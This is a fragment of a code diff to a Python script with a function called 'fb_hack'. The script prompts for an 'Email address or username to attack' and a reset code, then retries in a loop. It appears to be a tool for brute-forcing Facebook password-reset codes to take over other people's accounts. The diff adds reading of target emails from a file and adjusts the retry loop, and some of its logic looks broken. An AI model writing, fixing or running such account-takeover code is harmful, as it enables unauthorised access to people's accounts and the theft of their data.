@@ -254,7 +254,9 @@ def fb_hack(email, codex):
   return reset in reset1, y in passcoder, browser
 
 os.system('clear')
-ehack = input('Email address or username to attack:')
+f = open("emails.txt", "r")
+ehack = input('Email address or username to attack:') or f.readlines(-1)
+f.close()
 reset = int(input('Code: ') or 99999999)
 reset1 = reset
 f = open("emails.txt", "a")
@@ -268,7 +270,7 @@ while True:
   try:
     fb_hack(ehack, reset)
     reset = reset1
-    if int(reset1) < int(0):
+    if int(reset) < int(0):
       break
     else:
       reset = reset1
@@ -282,4 +284,3 @@ while True:
       z.close()
     print("Restarting")
     sleepy(30)
-    fb_hack(ehack, reset)
